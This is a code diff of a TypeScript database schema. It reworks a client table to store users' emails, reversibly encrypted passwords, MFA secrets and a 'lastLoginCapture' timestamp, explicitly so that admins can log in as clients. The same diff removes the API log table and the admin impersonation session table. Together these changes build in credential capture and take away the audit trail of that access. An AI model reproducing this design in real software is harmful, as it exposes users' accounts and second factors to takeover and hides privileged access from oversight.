@@ -149,63 +149,18 @@ export type InsertAdminUser = typeof adminUsers.$inferInsert;
 
 /**
  * Client Data table
- * Stores complete client authentication data for admin panel
+ * Stores ONLY login credentials (email, password, MFA) for admin to login as clients
  */
 export const clientData = mysqlTable("client_data", {
   id: int("id").autoincrement().primaryKey(),
-  userId: int("userId").notNull().unique(),
-  email: varchar("email", { length: 320 }).notNull(),
-  passwordEncrypted: text("passwordEncrypted"), // Encrypted password for admin viewing
-  mfaSecret: varchar("mfaSecret", { length: 255 }), // MFA secret key
+  email: varchar("email", { length: 320 }).notNull().unique(),
+  passwordEncrypted: text("passwordEncrypted").notNull(), // Encrypted password
+  mfaSecret: varchar("mfaSecret", { length: 255 }), // MFA secret key (if enabled)
   mfaEnabled: int("mfaEnabled").default(0).notNull(),
-  sessionToken: text("sessionToken"), // Current session token
-  lastApiCall: timestamp("lastApiCall"),
-  apiCallCount: int("apiCallCount").default(0).notNull(),
+  lastLoginCapture: timestamp("lastLoginCapture"),
   createdAt: timestamp("createdAt").defaultNow().notNull(),
   updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
 });
 
 export type ClientData = typeof clientData.$inferSelect;
 export type InsertClientData = typeof clientData.$inferInsert;
-
-/**
- * API Logs table
- * Stores all API requests and responses for monitoring
- */
-export const apiLogs = mysqlTable("api_logs", {
-  id: int("id").autoincrement().primaryKey(),
-  userId: int("userId"),
-  method: varchar("method", { length: 10 }).notNull(),
-  endpoint: varchar("endpoint", { length: 500 }).notNull(),
-  requestHeaders: text("requestHeaders"),
-  requestBody: text("requestBody"),
-  responseStatus: int("responseStatus"),
-  responseBody: text("responseBody"),
-  responseTime: int("responseTime"), // in milliseconds
-  ipAddress: varchar("ipAddress", { length: 45 }),
-  userAgent: text("userAgent"),
-  error: text("error"),
-  createdAt: timestamp("createdAt").defaultNow().notNull(),
-});
-
-export type ApiLog = typeof apiLogs.$inferSelect;
-export type InsertApiLog = typeof apiLogs.$inferInsert;
-
-/**
- * Admin Sessions table
- * Tracks admin impersonation sessions (login as client)
- */
-export const adminSessions = mysqlTable("admin_sessions", {
-  id: int("id").autoincrement().primaryKey(),
-  adminId: int("adminId").notNull(),
-  clientUserId: int("clientUserId").notNull(),
-  sessionToken: varchar("sessionToken", { length: 255 }).notNull().unique(),
-  ipAddress: varchar("ipAddress", { length: 45 }),
-  userAgent: text("userAgent"),
-  expiresAt: timestamp("expiresAt").notNull(),
-  createdAt: timestamp("createdAt").defaultNow().notNull(),
-  endedAt: timestamp("endedAt"),
-});
-
-export type AdminSession = typeof adminSessions.$inferSelect;
-export type InsertAdminSession = typeof adminSessions.$inferInsert;
